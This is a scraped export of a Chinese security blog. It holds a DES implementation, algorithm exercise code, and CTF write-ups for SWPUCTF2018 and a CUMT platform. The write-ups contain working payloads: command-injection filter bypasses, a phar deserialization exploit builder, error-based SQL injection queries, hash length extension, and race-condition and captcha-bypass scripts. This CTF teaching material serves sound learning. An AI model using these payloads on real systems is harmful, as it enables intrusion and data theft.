\"\" for j in range(32): r[i-1] += str(int(l[i][j])^int(f_result[j])) r[0] = r[1] secret_key = generate_secretkey(key,1) l[0] = \"\" f_result = f_function(r[1],secret_key,1) for j in range(32): l[0] += str(int(l[1][j])^int(f_result[j])) temp = l[0] + r[0] bintext = \"\" for i in range(64): bintext += temp[_ip[i]] plaintext = \"\" for i in range(8): plaintext += chr(int(bintext[8*i:8*i+8],2)) return plaintextdef str2bin(text): if len(text) % 8 != 0: text = text + \" \"*(8-(len(text)%8)) binplain = \"\" for i in text: binplain += '&#123;:0&gt;8&#125;'.format(bin(ord(i))[2:]) return binplaindef encrypt(text, key): longbinplain = str2bin(text) group_plain = \"\" longcipher = \"\" for i in range(len(longbinplain)//64): group_plain = \"\" group_plain = longbinplain[64*i:64*i+64] longcipher += des_encrypt(group_plain,key) return longcipher def decrypt(cipher,key): plaintext = \"\" for i in range(len(cipher)//16): plaintext += des_decrypt(cipher[16*i:16*i+16], key) return plaintext.rstrip()if __name__ == '__main__': mode = sys.argv[1] while mode in (\"e\",\"d\"): data = input(\"Plz input data: \") key = str(input(\"Plz input key: \")) if mode == \"e\": ans = encrypt(data, key) print(ans) elif mode == \"d\": ans = decrypt(data, key) print(ans) mode = input(\"quit or continue?\\n\") 为了增强通用性，增加代码重用性，该算法使用了包封装，从而使其能够被其它程序重用。该DES支持短信息加密，也支持长消息加密。为了使密文便于显示和存储转化为16进制显示 实例演示： 安全性分析 ​ DES算法具有极高的安全性，到目前为止，除了用穷举搜索法对DES算法进行攻击外，还没有发现更有效的办法。 而56位长的密钥的穷举空间为2^56，这意味着如果一台计算机的速度是每一秒钟检测一百万个密钥，则它搜索完全部密钥就需要将近2285年的时间，可见，这是难以实现的。然而，这并不等于说DES是不可破解的。而实际上，随着硬件技术和Internet的发展，其破解的可能性越来越大，而且，所需要的时间越来越少。使用经过特殊设计的硬件并行处理要几个小时。 ​ 由DES算法的密钥生成步骤中我们可以看到：DES算法中只用到64位密钥中的其中56位，而第8、16、24、……64位8个位并未参与DES运算，这一点，向我们提出了一个应用上的要求，即DES的安全性是基于除了8，16，24，……64位外的其余56位的组合变化256才得以保证的。因此，在实际应用中，我们应避开使用第8，16，24，……64位作为有效数据位，而使用其它的56位作为有效数据位，才能保证DES算法安全可靠地发挥作用。如果不了解这一点，把密钥Key的8，16，24，….. .64位作为有效数据使用，将不能保证DES加密数据的安全性，对运用DES来达到保密作用的系统产生数据被破译的危险，这正是DES算法在应用上的误区，留下了被人攻击、被人破译的极大隐患。 ​ 此外，由于DES算法各轮（F函数）的子密钥是通过改变初始密钥这种方式得到的，因此有些初始密钥成了弱密钥（weakkey）。初始密钥分成两部分，每部分各自独立的移动。如果每一部分的所有位都是0或1，那么算法的任意一个周期的密钥都是相同的。当密钥是全1、全0、或者一半全1、一半全0时，会发生这种情况。所以我们在选择密钥时要进行检查，以防止产生弱密钥。 ​ 随着密码学的发展，差分分析和线性分析的发展对分组密码的安全性构成了挑战，也推动了分组密码设计技术的发展。 ​ 随着计算机计算能力的提高与密码分析技术的进步，DES的密钥长度已经被证明不能够满足当前安全性能的需求，为了克服DES密钥空间小的缺陷，人们又提出了三重DES的变形形式，即使用多个不同的DES秘钥利用DES算法对明文进行多次加密，这样可以增加密钥量。 算法实用性分析 ​ DES算法拥有着良好的安全性，目前最有效的破解方法依然是穷举攻击，所以在一些安全性要求相对不高的情况下可以使用DES算法，此外，由于DES的广泛的使用量，为了充分利用有关DES的软硬件资源，可以使用DES的改进算法如三重DES算法等。 ​ 由于DES算法要进行多轮迭代，所以DES的运算速度相对较慢，此外，密码生命周期也比较短。 ​ 分组密码与序列密码相比，具有扩散性好，插入敏感等优点，缺点是加解密处理速度慢、存在错误传播。用途上，在对于处理数据分组的应用，比如文件传递、电子邮件，分组密码非常合适。","categories":[{"name":"Record","slug":"Record","permalink":"http://chaosec.top/categories/Record/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://chaosec.top/tags/Crypto/"}]},{"title":"简单算法记录","slug":"suanfa","date":"2019-01-01T08:45:12.000Z","updated":"2019-01-30T12:26:10.697Z","comments":true,"path":"2019/01/01/suanfa/","link":"","permalink":"http://chaosec.top/2019/01/01/suanfa/","excerpt":"前言 最近在刷oj，感觉自己菜的抠脚，算法也不是很熟悉，需要加强一下，正好也为了后面的oj测试准备一下","text":"前言 最近在刷oj，感觉自己菜的抠脚，算法也不是很熟悉，需要加强一下，正好也为了后面的oj测试准备一下 动态规划 最长公共子序列 题目描述给你一个序列X和另一个序列Z，当Z中的所有元素都在X中存在，并且在X中的下标顺序是严格递增的，那么就把Z叫做X的子序列。例如：Z=是序列X=的一个子序列，Z中的元素在X中的下标序列为。现给你两个序列X和Y，请问它们的最长公共子序列的长度是多少？ 输入输入包含多组测试数据。每组输入占一行，为两个字符串，由若干个空格分隔。每个字符串的长度不超过100。 输出对于每组输入，输出两个字符串的最长公共子序列的长度。 最长公共子序列问题，递推公式为 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include&lt;iostream&gt;#include&lt;string&gt;using namespace std;string x;string y;int b[105][105],c[105][105];void LCSLength(int m, int n)&#123; for(int i=0;i&lt;=m;i++) c[i][0] = 0; for(int i=0;i&lt;=n;i++) c[0][i] = 0; for(int i=0;i&lt;m;i++) for(int j=0;j&lt;n;j++)&#123; if(x[i]==y[j])&#123; c[i][j] = c[i-1][j-1] + 1; b[i][j] = 1; &#125;else if(c[i-1][j]&gt;c[i][j-1])&#123; c[i][j] = c[i-1][j]; b[i][j] = 2; &#125;else&#123; c[i][j] = c[i][j-1]; b[i][j] = 3; &#125; &#125;&#125;//寻找最优解void traceback(int i,int j)&#123; if(i==-1||j==-1) return; if(b[i][j]==1)&#123; cout&lt;&lt;x[i]; traceback(i-1,j-1); &#125; else if(b[i][j]==2) traceback(i-1,j); else traceback(i,j-1);&#125;int main()&#123; while(cin&gt;&gt;x&gt;&gt;y)&#123; int a = x.length(); int b = y.length(); LCSLength(a,b); cout&lt;&lt;c[a-1][b-1]&lt;&lt;endl; traceback(a-1, b-1); cout&lt;&lt;endl; &#125; return 0;&#125; 最大字段和 题目描述给定n个整数组成的序列a1,a2,…an, 求子段和ai+ai+1+…+aj（子段可为空集）的最大值。 输入包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=20)，代表测试数据个数。每组测试数据第一行为一个整数n，代表有n个整数(1&lt;=n&lt;=10000)。接下来一行有n个数x(-1000&lt;=x&lt;=1000)。 输出输出其对应的最大子段和。 递推公式 1b[i] &#x3D; max&#123;b[i-1]+a[i], a[i]&#125; (1≤i≤n) 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include&lt;iostream&gt;int num[10005];using namespace std;//再给出输出最优解的方法int temp_start,len;int besti,bestj;void get_res()&#123; for(int i=besti;i&lt;bestj;i++)&#123; cout&lt;&lt;num[i]&lt;&lt;\" \"; &#125; cout&lt;&lt;endl;&#125;int main()&#123; int t,n; int b = 0; int ans =0; cin&gt;&gt;t; while(t&gt;0)&#123; cin&gt;&gt;n; for(int i=0;i&lt;n;i++)&#123; cin&gt;&gt;num[i]; &#125; temp_start = 0; len = 1; for(int i=0;i&lt;n;i++)&#123; if(b&gt;0)&#123; b = b + num[i]; len++; &#125;else&#123; b = num[i]; temp_start = i; len = 1; &#125; if(ans &lt; b)&#123; ans = b; besti = temp_start; bestj = temp_start + len; &#125; &#125; cout&lt;&lt;ans&lt;&lt;endl; //get_res(); t--; &#125; return 0;&#125; 矩阵连乘 待续 0-1背包 题目描述已知有N种物品和一个可容纳C重量的背包。每种物品i的重量为Wi，价值为Pi。那么，采用怎样的装包方法才会使装入背包物品的总价值最大。 输入包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=10)，代表测试数据个数。 接下来有T组测试数据。每组测试数据第一行为背包的重量C(C&lt;10000)和物品个数N(N&lt;1000)。接下来的N行分别为物品的重量cost(1&lt;=cost&lt;=100)和价值val(1&lt;=val&lt;=3000000)。（注意：结果可能超过int范围） 输出对每组测试数据，输出其对应的所装物品的最大价值。 12345678910111213141516171819202122232425262728293031323334353637383940#include&lt;iostream&gt;#include&lt;algorithm&gt;using namespace std;int c,n;int x[1005];long w[1005];long v[1005];long long m[1005][10005];//数组长度要开的合适一点void pack()&#123; for(int i=0;i&lt;w[n];i++) m[n][i] = 0; for(int i=w[n];i&lt;=c;i++) m[n][i] = v[n]; for(int i=n-1;i&gt;0;i--)&#123; for(int j=0;j&lt;w[i];j++) m[i][j] = m[i+1][j]; for(int j=w[i];j&lt;=c;j++)&#123; m[i][j] = max(m[i+1][j],m[i+1][j-w[i]]+v[i]); &#125; &#125;&#125;//利用m的下标的意义来构造最优解 void traceback()&#123; for(int i=1;i&lt;=n;i++)&#123; if(m[i][c]!=m[i+1][c])&#123; cout&lt;&lt;i&lt;&lt;\" \"; c -= w[i]; &#125; &#125; cout&lt;&lt;endl;&#125; int main()&#123; int t; cin&gt;&gt;t; while(t--)&#123; cin&gt;&gt;c&gt;&gt;n; for(int i=1;i&lt;=n;i++) cin&gt;&gt;w[i]&gt;&gt;v[i]; pack(); cout&lt;&lt;m[1][c]&lt;&lt;endl; //traceback(); &#125; return 0;&#125;","categories":[{"name":"Record","slug":"Record","permalink":"http://chaosec.top/categories/Record/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://chaosec.top/tags/Algorithm/"}]},{"title":"SWPUCTF2018复现","slug":"SWPUCTF2018","date":"2018-12-20T05:00:25.000Z","updated":"2019-02-16T08:30:36.955Z","comments":true,"path":"2018/12/20/SWPUCTF2018/","link":"","permalink":"http://chaosec.top/2018/12/20/SWPUCTF2018/","excerpt":"题目复现","text":"题目复现 MISC 其它两道都很简单，就不记录了，只记录一下没做出来的 唯有低头,才能出头 做的时候知道是键盘加密，但是对于数字理解错误了，我以为是手机键盘的九键加密…，所以走远了，记录一下这种加密方法，对应于键盘的盲打手势对应字母 1299 9 9 88 11 5 5 66 3 88 3 6 555 9 11 4 33lookatthekeyboard WEB 用优惠码 买个 X? 注册并登录之后，页面弹出一个优惠码 uKnfZ2F0aFaZBFy ，但是输入之后却失效，要求我们输入24位的优惠码，题目存在文件泄露 www.zip，下载源码 123456789101112131415161718192021222324252627&lt;?php//生成优惠码$_SESSION['seed']=rand(0,999999999);function youhuima()&#123; mt_srand($_SESSION['seed']); $str_rand = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\"; $auth=''; $len=15; for ( $i = 0; $i &lt; $len; $i++ )&#123; if($i&lt;=($len/2)) $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1); else $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1); &#125; setcookie('Auth', $auth);&#125;//support if (preg_match(\"/^\\d+\\.\\d+\\.\\d+\\.\\d+$/im\",$ip))&#123; if (!preg_match(\"/\\?|flag|&#125;|cat|echo|\\*/i\",$ip))&#123; //执行命令 &#125;else &#123; //flag字段和某些字符被过滤! &#125; &#125;else&#123; // 你的输入不正确! &#125;?&gt; 可以看出题目使用了md_srand()函数来产生随机数，而PHP中产生的是伪随机数，即只要我们知道种子的话，那么后续产生的随机数我们也就都可以知道，所以现在就是要爆破随机数种子，可以用php_me_seed工具来爆破，速度快一些，但是我们要先将数据处理为该工具能够识别的输入参数 123456789101112$pass = \"b1o2OrrgqYPMkzK\";$str_rand = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";$len = strlen($str_rand) -1;for ($i=0; $i&lt;strlen($pass); $i++)&#123; if($i&lt;=(15/2))&#123; $number = strpos($str_rand,$pass[i]); echo \"$number $number 0 $len\"; &#125;else&#123; $number = $len + 1 - strpos($str_rand,$pass[i]); echo \"$number $number 0 $len\"; &#125;&#125; 这样可以得到我们爆破的种子 然后用该种子来生成24位的优惠码（这儿当时想不通哪来的24位，原来就是把代码中长度15改为24就可以了Orz）,此时注意php版本不同的话相同的种子也会产生不同的序列，看网站响应头可知该网站php版本为7.2，所以用对应版本生成优惠码即可 然后就是后半段的命令执行绕过了 12345678910//support if (preg_match(\"/^\\d+\\.\\d+\\.\\d+\\.\\d+$/im\",$ip))&#123; if (!preg_match(\"/\\?|flag|&#125;|cat|echo|\\*/i\",$ip))&#123; //执行命令 &#125;else &#123; //flag字段和某些字符被过滤! &#125; &#125;else&#123; // 你的输入不正确! &#125; 对于第一个首尾匹配直接 %0a 换行即可绕过，第二个过滤了通配符，flag字段，可以用单引号绕过，cat命令不能用了就用tail命令即可 1ip&#x3D;1.1.1.1%0atail &#x2F;&#39;fl&#39;ag 方方土学长用的是\\绕过，原理是反斜杠会转义特殊字符，而如果字符不是shell特殊字符的话则不转义 1ip&#x3D;1.1.1.1%0atail &#x2F;fl\\ag SimplePHP 查看文件出存在文件读取漏洞，利用该漏洞读取文件源码， 1http://120.79.158.180:11115/file.php?file=index.php 关键源码如下 function.php 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php //show_source(__FILE__); include \"base.php\"; header(\"Content-type: text/html;charset=utf-8\"); error_reporting(0); function upload_file_do() &#123; global $_FILES; $filename = md5($_FILES[\"file\"][\"name\"].$_SERVER[\"REMOTE_ADDR\"]).\".jpg\"; //mkdir(\"upload\",0777); if(file_exists(\"upload/\" . $filename)) &#123; unlink($filename); &#125; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],\"upload/\" . $filename); echo '&lt;script type=\"text/javascript\"&gt;alert(\"上传成功!\");&lt;/script&gt;'; &#125; function upload_file() &#123; global $_FILES; if(upload_file_check()) &#123; upload_file_do(); &#125; &#125; function upload_file_check() &#123; global $_FILES; $allowed_types = array(\"gif\",\"jpeg\",\"jpg\",\"png\"); $temp = explode(\".\",$_FILES[\"file\"][\"name\"]); $extension = end($temp); if(empty($extension)) &#123; //echo \"&lt;h4&gt;请选择上传的文件:\" . \"&lt;h4/&gt;\"; &#125; else&#123; if(in_array($extension,$allowed_types)) &#123; return true; &#125; else &#123; echo '&lt;script type=\"text/javascript\"&gt;alert(\"Invalid file!\");&lt;/script&gt;'; return false; &#125; &#125; &#125; ?&gt; file.php 1234567891011121314151617&lt;?php header(\"content-type:text/html;charset=utf-8\"); include 'function.php'; include 'class.php'; ini_set('open_basedir','/var/www/html/'); $file = $_GET[\"file\"] ? $_GET['file'] : \"\"; if(empty($file)) &#123; echo \"&lt;h2&gt;There is no file to show!&lt;h2/&gt;\"; &#125; $show = new Show(); if(file_exists($file)) &#123; $show-&gt;source = $file; $show-&gt;_show(); &#125; else if (!empty($file))&#123; die('file doesn\\'t exists.'); &#125; ?&gt; class.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778&lt;?phpclass C1e4r&#123; public $test; public $str; public function __construct($name) &#123; $this-&gt;str = $name; &#125; public function __destruct() &#123; $this-&gt;test = $this-&gt;str; echo $this-&gt;test; &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file) &#123; $this-&gt;source = $file; echo $this-&gt;source; &#125; public function __toString() &#123; $content = $this-&gt;str['str']-&gt;source; return $content; &#125; public function __set($key,$value) &#123; $this-&gt;$key = $value; &#125; public function _show() &#123; if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this-&gt;source)) &#123; die('hacker!'); &#125; else &#123; highlight_file($this-&gt;source); &#125; &#125; public function __wakeup() &#123; if(preg_match(\"/http|https|file:|gopher|dict|\\.\\./i\", $this-&gt;source)) &#123; echo \"hacker~\"; $this-&gt;source = \"index.php\"; &#125; &#125;&#125;class Test&#123; public $file; public $params; public function __construct() &#123; $this-&gt;params = array(); &#125; public function __get($key) &#123; return $this-&gt;get($key); &#125; public function get($key) &#123; if(isset($this-&gt;params[$key])) &#123; $value = $this-&gt;params[$key]; &#125; else &#123; $value = \"index.php\"; &#125; return $this-&gt;file_get($value); &#125; public function file_get($value) &#123; $text = base64_encode(file_get_contents($value)); return $text; &#125;&#125;?&gt; 看到出现了类，思路就基本上是php反序列化了，但是代码中并没有反序列化函数的调用，但是在file.php中看到存在file_exists()函数，该函数是可以通过phar协议实现反序列化的参考文章，接下里的思路就是构造pop链，题目中有提示 &lt;!--flag is in f1ag.php--&gt; ，所以要尝试读取f1ag.php文件 在Show类的show方法中过滤了f1ag字段，那么这个方法应该不行，看了大佬的pop链构造思路，Test类中有file_get_contents()函数可以读取文件内容，所以可以尝试反序列化Test类，file_get()方法被get方法调用，而get方法是被get()魔术方法调用 当读取不可访问属性的值时，__get() 会被调用。也就是，当想要获取一个类的私有属性，或者获取一个类并为定义的属性时。该魔术方法会被调用。 可以看到我们需要访问一个不可访问的变量，在Show中的toString()方法中，运行了 $content = $this-&gt;str[&#39;str&#39;]-&gt;source;，该语句会访问不存在的变量source，所以接下来就是要触发toString()方法，正好在C1e4r类中destruct()类中 echo $this-&gt;test; 则会触发toString()方法，至此pop链构造完成: 12341.C1e4r类的__destruct()中的echo $this-&gt;test;2.Show中的__toString()中的$content &#x3D; $this-&gt;str[&#39;str&#39;]-&gt;source;3.Test中的__get()方法4.利用file_get_contens()读文件 1234567891011121314$a = new Test();$a-&gt;params = array(\"source\"=&gt;'/var/www/html/f1ag.php');$b = new Show('index.php');$b-&gt;str['str'] = $a;$c= new C1e4r($b);echo serialize($c);$obj = unserialize('O:5:\"C1e4r\":2:&#123;s:4:\"test\";N;s:3:\"str\";O:4:\"Show\":2:&#123;s:6:\"source\";s:9:\"index.php\";s:3:\"str\";a:1:&#123;s:3:\"str\";O:4:\"Test\":2:&#123;s:4:\"file\";N;s:6:\"params\";a:1:&#123;s:6:\"source\";s:22:\"/var/www/html/f1ag.php\";&#125;&#125;&#125;&#125;&#125;');$phar = new Phar('exploit.phar');$phar-&gt;startBuffering();$phar-&gt;addFromString('test.php', 'test');$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ? &gt;');$phar-&gt;setMetadata($obj);$phar-&gt;stopBuffering();rename('exploit.phar', 'skyfuck.gif'); 然后提交即可 1phar:&#x2F;&#x2F;upload&#x2F;680b7502eaac53cac3f3eca74d50f537.jpg","categories":[{"name":"复现","slug":"复现","permalink":"http://chaosec.top/categories/%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"http://chaosec.top/tags/Web/"},{"name":"Misc","slug":"Misc","permalink":"http://chaosec.top/tags/Misc/"}]},{"title":"CUMT网络安全实训平台题目记录","slug":"cumtctf","date":"2018-12-07T15:55:48.000Z","updated":"2019-01-31T04:28:04.010Z","comments":true,"path":"2018/12/07/cumtctf/","link":"","permalink":"http://chaosec.top/2018/12/07/cumtctf/","excerpt":"CUMT网络安全实训平台题目记录","text":"CUMT网络安全实训平台题目记录 WEB 源代码 查看源代码，在最后发现一段字符 1&lt;!--该f配l合a你g演&#123;出y的o我u演f视i而n不d见m别e逼2一3个3最3爱3你3的3人3即3兴3表3演&#125;--&gt; 提取出字符即可得到flag colorSnake 前端题目，一头雾水，看了别人的wp，查看源代码在页面地段可以看到有一个game.js，跟过去看一下， 123456789xhr('./getScore.php',function(e)&#123; var r = JSON.parse(e); if(r.state == 200) game.addScore(r.score); else&#123; alert(r.msg); game.start() &#125; &#125;) 尝试在控制台提交 123456789setInterval(function()&#123;xhr(&#39;.&#x2F;getScore.php&#39;,function(e)&#123; var r &#x3D; JSON.parse(e); if(r.state &#x3D;&#x3D; 200) game.addScore(r.score); else&#123; alert(r.msg); game.start() &#125; &#125;)&#125;,1) 会发现id确实增加了，我们可以通过修改参数使它实现多次递增从而达到50分，最终payload 123456789setInterval(function()&#123;xhr(&#39;.&#x2F;getScore.php&#39;,function(e)&#123; var r &#x3D; JSON.parse(e); if(r.state &#x3D;&#x3D; 200) game.addScore(r.score); else&#123; alert(r.msg); game.start() &#125; &#125;)&#125;,1000) 备份 题目给出了信息 1.bak 2.bak There are too much baks in the website ,can you find the flag in these baks? 尝试访问1.bak，2.bak，没有发现flag，继续访问3.bak，4.bak等都存在文件，只是没有flag，猜测flag应该在某个*.bak，中，bp爆破一下，在998.bak中发现了flag 上传一 题目要求上传jpg后缀，写一个PHP文件修改后缀为jpg，之后抓包修改文件名后缀为PHP再发包（因为它是在前端验证文件是否合法） 之后就可以惊喜的看到本题的flag和下个“上传2”题目的flag（2333..） 自动获取flag程序 题目说了要修改一下程序，查看源代码 123456789101112131415161718192021222324252627282930313233// 请求参数一$(\"#a\").click(function()&#123; $.ajax(&#123; url:'param1.php', method:'get', dataType:'json', success:calParam2 &#125;)&#125;);function calParam2(d)&#123; var data=JSON.parse((d.param)); var length=data.length; var second=new Date().getSeconds(); var sum=0; for (var i = 1; i &lt; length; i++) &#123; for (var j = 0; j &lt; length/2; j++) &#123; sum+=parseInt(data[i])*second + data[j]; &#125; &#125; // 请求flag $.ajax(&#123; url:'http://new.ctf.param.com/aram2.php?sum='+sum, method:'get', dataType:'json', success:function(s)&#123; alert(s.f); &#125;, error:function(s)&#123; alert('错了'); &#125; &#125;)&#125; 看到有个param1.php的请求，访问一下得到 1&#123;&quot;param&quot;:&quot;[&quot;1&quot;,&quot;6&quot;,&quot;2&quot;,&quot;8&quot;,&quot;4&quot;,&quot;2&quot;,&quot;8&quot;,&quot;4&quot;,&quot;9&quot;,&quot;1&quot;,&quot;10&quot;]&quot;&#125; Cookie？ 查看cookie发现user值为guest，改为admin再刷新即可 一看就是维吉尼亚密码，解密一下就可以了 上传二 见上传一 logic 查看源代码可以发现 应该是存在vim泄漏，尝试访问 submit.php.swp 发现泄漏文件，关键代码如下 12345678910111213if(!empty($token)&amp;&amp;!empty($emailAddress))&#123; if(strlen($token)!=10) die('fail'); if($token!='0') die('fail'); $sql = \"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'\"; $r = mysql_query($sql) or die('db error'); $r = mysql_fetch_assoc($r); $r = $r['num']; if($r&gt;0)&#123; echo $flag; &#125;else&#123; echo \"失败了呀\"; &#125;&#125; 题目一看就是很简单的弱比较，但是提交之后却无法正常回显，而是返回you are not admin，再看上图，admin应该就是chengyurui，所以邮箱为 chenyurui@gmail.com ，再提交一个0e12345678 即可。 上传三 bp抓包尝试不同的后缀，尝试 phtml 发现可以上传成功，即上传 snow.phtml ，题目返回信息 可以看到我们的文件已经上传成功了(文件被执行了)，只是被后台查杀了，这就说明我们可以利用条件竞争来做这道题 用burpsuite连续发包，在写个代码连续读取 123456import requestsurl = \"http://202.119.201.199/challenge/web/uploadfile/upload/snow.phtml\"while True: content = requests.get(url).text if \"flag\" in content: print(content) 然后即可读到flag is hash safe?? 题目给出了提示，应该是文件泄露，发现admin.php.swp存在，下载之，在linux下输入命令 1vim -r amdin.php.swp 即可恢复出源代码，核心代码如下 123456789101112131415161718192021222324252627282930&lt;?php$auth = false;$role = \"guest\";$salt =\"xxxxxxxxxxxxx\";//len:13if (isset($_COOKIE[\"role\"])) &#123; $role = $_COOKIE[\"role\"]; $hsh = $_COOKIE[\"hsh\"]; if (stripos($role,\"admin\")!==false&amp;&amp;$hsh === md5($salt.$_COOKIE[\"role\"])) &#123; $auth = true; &#125; else &#123; $auth = false; &#125;&#125; else &#123; $s = $role; setcookie('role',$s); $hsh = md5($salt.$s); setcookie('hsh',$hsh);&#125;if ($auth) &#123; echo \"&lt;h3&gt;Welcome Admin.Your flag is cumtctf&#123;you_know_this_is_not_the_flag&#125;\";&#125; else &#123; echo \"&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;\";&#125;?&gt; 一看就是哈希长度扩展攻击 原理介绍工具介绍 我们可以用hashpump工具来做 由上面介绍的原理可以知道，在本题中，参与第一次md5哈希的可控字符串为guest，也就是说，本题中，我们已知的内容有$salt（代码加的盐，具体内容未知）的长度为13，$salt与guest拼接后的MD5哈希值c70ab9d039f166c5b5f506a5698ebaa1，那么基于此，我们可以构造哈希扩展攻击 Input signature输入明文哈希，Input data输入第一次参与哈希的字符串的结尾的一部分，长度为$salt长度加上去掉inputdata之后字符串的长度，附加值随便，但是不能空，由于本题需要role中存在admin，所以我追加的是admin。比如本题中原来第一次参与hash的字符串为guest，我选择最后一个字符t作为inputdata，那么长度就为len($salt)+len(&#39;gues&#39;)=17，之后就会返回构造好的字符串和哈希值，把上面的\\x替换为%，之后修改cookie值，role=&gt;guest%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00admin，hsh=&gt;37d0fe2c401a689be9608e9f850ef3de，再刷新就可以得到flag了。 淘金 这个题目的目标是抢金币达到1000即可通关，每次抢金币需要在三秒内输入验证码，成功即可抢到1金币，如果有毅力的话是可以手动抢的，或者写一个在线识别验证码的程序来自动抢也是可以的，但是这题还有更好的方案就是在我们提交验证码的环节，如果我们在请求中删去验证码字段即可成功抢到金币（也就是说验证码使可以绕过的），只是不确定这个是题目漏洞还是正解。代码如下，为了效率，同时抢多个人· 123456789101112131415import requestsimport timeurl_post = r'http://bxs.cumt.edu.cn/challenge/web/robber/dorob.php'url_get = r'http://bxs.cumt.edu.cn/challenge/web/robber/rob.php?id='cookies=&#123;\"PHPSESSID\":\"2fle5nf7jrvi8lksme7uq0j1a3\",\"ssid\":\"a9598c3315159a39bbd981b8ec6fdb6d\"&#125; s = requests.session()names = [\"bxsrc\",\"333\",\"08163266\",\"EddieIvan\"]ids = [144,125,142,109]while True: for i in range(len(names)): data = \"user=\"+str(ids[i])+\"&amp;num=1\" req1 = s.get(url=url_get+str(ids[i]),cookies=cookies) print(url_get+str(ids[i])) req2 = s.post(url=url_post,cookies=cookies,data=data) time.sleep(5) 听说你会面向对象 题目给出了源代码，核心代码如下 123456789101112131415161718192021222324252627&lt;?php//flag in flag.phpclass Admin&#123; public $file = 'flag.php'; public function __construct($f) &#123; $this-&gt;file = $f; &#125; public function __wakeup() &#123; // TODO: Implement __wakeup() method. if (stripos($this-&gt;file,'flag')+1)&#123; echo 'dangerrous'; $this-&gt;file = 'index.php'; &#125; &#125; public function __destruct() &#123; var_dump($this-&gt;file); var_dump(file_exists($this-&gt;file)); // TODO: Implement __destruct() method. if (!strpos($this-&gt;file,'/')&amp;&amp;!strpos($this-&gt;file,'\\\\'))&#123; highlight_file($this-&gt;file); &#125;else die('你想干嘛'); &#125;&#125; 题目需要绕过需要__wakeup()函数，百度发现该处存在一个CVE漏洞 Click Here 我们写php代码序列化 12345class Admin&#123; public $file = 'flag.php';&#125;$obj = new Admin();echo serialize($obj); 题目返回 O:5:&quot;Admin&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} ，我们只需要把Admin后面的1修改为2然后在url编码即可，最终payload 1O%3A5%3A%22Admin%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D phpmywind 首先得到flag非常简单，题目好像出bug了，访问首页直接就可以得到flag：） 但是题目好像修复了(事实上题目本身没有任何问题，之所以可看到flag是因为已经有大佬做出来了)，所以我们还是要来一波正解 题目给出来cms和版本，直接百度搜索漏洞，发现有个前台sql注入漏洞，需要先注册一个合法用户，我注册了一个用户为test_snow，密码123456，登录，然后在该网址下提交如下内容(因为该题目没有回显，所以使用了报错注入) 于是就可以看到数据库名，说明该报错方法可用， 但是该语句无法使用select语句，网上查找到了另一种报错注入的方法 1select count(*),concat(char(@&#96;%27&#96;),(select schema_name from information_schema.schemata limit 1,1), 0x23,floor(rand(0)*2),char(@&#96;%27&#96;))x from information_schema.tables group by x 可以利用这种方法报库名，发现这个库名为 phpmyflag ，虽然不是当前库，但是flag应该就是在这个库中 爆表名 1select count(*),concat(char(@&#96;%27&#96;),(select table_name from information_schema.tables where table_schema&#x3D;0x7068706d79666c6167 limit 0,1), 0x23,floor(rand(0)*2),char(@&#96;%27&#96;))x from information_schema.tables group by x 本题中如果没有报错的话就会显示账号完善成功，这里只需要再次登录一下就可以了，由于题目转义过滤了单引号，所以使用了十六进制绕过 爆列名 1select count(*),concat(char(@&#96;%27&#96;),(select column_name from information_schema.columns where table_name&#x3D;0x666c6167 limit 0,1), 0x23,floor(rand(0)*2),char(@&#96;%27&#96;))x from information_schema.tables group by x 读flag 1select count(*),concat(char(@&#96;%27&#96;),(select flag from phpmyflag.flag limit 0,1), 0x23,floor(rand(0)*2),char(@&#96;%27&#96;))x from information_schema.tables group by x 之前我以为flag在当前数据库中，走了不少弯路，看来还是自己思维太局限了 参考链接 BASIC decode hex打开再base64解码即可 白驹过隙 访问题目出现 You Have Missed the Flag ~&gt;.&lt;~ 开始猜测可能是某次返回的正确的flag，于是一连访问了1000次还是一无所获，后面想到它说 “You Missed flag”，所以思路应该是发生了302跳转，抓包也没有发现什么异常，没找到时哪儿发生了302跳转，后面一个偶然的机会，我们在原来题目链接出查看一下链接 再看题目页面的链接 http://202.119.201.199/challenge/basic/http/defauIt.php 仔细看一下，会发现两个 default.php 中题目给的链接中default倒数第二位是小写的L，而到了题目中变成了大写的 i ！！，如此的话跳转就清楚了，可以访问default.php(l为小写的L) 可以看到确实发生了302跳转，抓包 可以看到此处跳转到了defauIt.php(大写的i)，也可以看到我们读到了flag 或者你也可以直接挑战页面点击题目链接抓包，也可以读到flag，原理是一样的 齐白石 16进制编辑器查看一下即可在字符串末尾看到flag encode 题目给出的是jsfuck代码，直接找在线网站运行一下借口得到flag DNS解析 直接修改本地hosts文件解开，linux下修改/etc/hosts文件，添加一行数据 1202.119.201.199 welcome.bxsteam.xyz 然后访问welcome.bxsteam.xyz即可得到flag 签到1 邮件查看源代码，base64解码一下即可得到flag 签到2 按照题目要去F12转到控制台在点击网络选项卡，选择重新载入，之后再消息头中的flag字段即可看到flag 